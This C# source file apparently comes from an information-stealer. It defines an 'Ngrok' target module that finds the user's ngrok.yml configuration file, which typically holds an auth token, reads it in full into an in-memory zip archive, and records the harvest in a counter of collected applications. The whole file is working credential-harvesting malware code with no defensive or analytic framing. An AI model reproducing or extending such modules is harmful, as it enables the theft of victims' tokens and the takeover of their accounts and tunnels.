using Helper.Data;
using System;
using System.IO;

namespace Targets.Applications
{
	public class Ngrok : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ngrok", "ngrok.yml");
	    if (!File.Exists(path))
	      return;
	    string entryPath = "Ngrok\\ngrok.yml";
	    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
	    counterApplications.Name = nameof (Ngrok);
	    zip.AddFile(entryPath, File.ReadAllBytes(path));
	    counterApplications.Files.Add($"{path} => {entryPath}");
	    counterApplications.Files.Add(entryPath);
	    counter.Applications.Add(counterApplications);
	  }
	}
}
